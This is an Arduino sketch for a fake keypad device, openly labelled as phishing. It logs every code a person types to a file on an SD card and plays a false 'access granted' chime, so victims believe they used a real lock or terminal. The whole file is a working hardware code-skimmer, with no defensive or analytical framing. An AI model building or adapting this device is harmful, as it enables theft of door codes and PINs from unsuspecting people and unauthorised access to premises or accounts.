#include <SPI.h>
#include <SD.h>
#include <Keypad.h>

const byte ROWS = 4; //four rows
const byte COLS = 3; //three columns
char keys[ROWS][COLS] = {
  {'1', '2', '3'},
  {'4', '5', '6'},
  {'7', '8', '9'},
  {'*', '0', '#'}
};
byte rowPins[ROWS] = {5, 9, 3, 2}; //connect to the row pinouts of the keypad
byte colPins[COLS] = {8, 7, 6}; //connect to the column pinouts of the keypad
Keypad keypad = Keypad( makeKeymap(keys), rowPins, colPins, ROWS, COLS );
File myFile;
int LOOPS_BEFORE_NEW_LINE = 20;


void setup() {
  // Open serial communications and wait for port to open:
  Serial.begin(9600);
  while (!Serial) {
    ; // wait for serial port to connect. Needed for native USB port only
  }
  pinMode(10,OUTPUT);
  Serial.print("Initializing SD card...");
  if (!SD.begin(4)) {
    Serial.println("initialization failed. Things to check:");
    Serial.println("1. is a card inserted?");
    Serial.println("2. is your wiring correct?");
    Serial.println("3. did you change the chipSelect pin to match your shield or module?");
    Serial.println("Note: press reset or reopen this serial monitor after fixing your issue!");
    while (1);
  }
  Serial.println("initialization done.");
  // open the file. note that only one file can be open at a time,
  // so you have to close this one before opening another.
  myFile = SD.open("codes.txt", FILE_WRITE);
  // if the file opened okay, write to it:
  if (myFile) {
    Serial.print("Writing to codes.txt...");
    myFile.println("Start Phishing...");
    // close the file:
    myFile.close();
    Serial.println("done.");
  } else {
    // if the file didn't open, print an error:
    Serial.println("error opening codes.txt");
  }
}
void loop() {
  myFile = SD.open("codes.txt", FILE_WRITE);
  char key = getKeysLoop(LOOPS_BEFORE_NEW_LINE);
  if (myFile && key != NO_KEY) {
      while (key != NO_KEY) {
        Serial.print(key);
        myFile.print(key);
        beep();
        delay(150);
        key = getKeysLoop(LOOPS_BEFORE_NEW_LINE);
      }
      access();
      myFile.print('\n');
    }
    myFile.flush();
    myFile.close();

}
char getKeysLoop(int loops) {
  char key = keypad.getKey();
  while (key == NO_KEY && loops > 0) {
    delay(150);
    key = keypad.getKey();
    loops--;
  }
  return key;
}
void beep(){
  tone(10,2000,200);
}
void access(){
  tone(10,4000,500);
  delay(500);
  tone(10,3500,500);
  delay(500);
  tone(10,3000,500);
  delay(200);

}